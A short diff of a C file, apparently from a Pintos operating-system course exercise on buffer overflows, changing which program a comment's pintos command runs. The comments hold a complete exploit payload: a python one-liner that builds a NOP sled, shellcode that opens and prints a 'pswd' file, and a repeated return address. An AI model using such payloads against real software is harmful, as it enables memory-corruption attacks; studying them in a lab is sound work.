@@ -22,7 +22,7 @@ int main( int argc, char *argv[] ) {
 
 /* FINAL */
 // python -c "print('\x90'*44+'\x6A\x00\x68\x70\x73\x77\x64\x54\x6A\x06\xCD\x30\x89\xC2\x52\x6A\x07\xCD\x30\x89\xC1\x29\xCC\x89\xE3\x51\x53\x52\x6A\x08\xCD\x30\x89\xC1\x51\x53\x6A\x01\x6A\x09\xCD\x30\x52\x6A\x0C\xCD\x30\x68\x9A\x02\x00\x00\x6A\x01\xCD\x30'+'\x90'*40+'\x56\xfe\xff\xbf'*60)" > ./shellcode
-// pintos -p ./pswd -a pswd -p ./shellcode -a sh -p ../../examples/shellcode -a shellcode -- -f -q run 'shellcode sh'
+// pintos -p ./pswd -a pswd -p ./shellcode -a sh -p ../../examples/overflow_yazeed -a overflow -- -f -q run 'overflow sh'
 
 // push   0x0               ; push null character to indicate end of file name
 // push   0x64777370        ; push file name in hex format
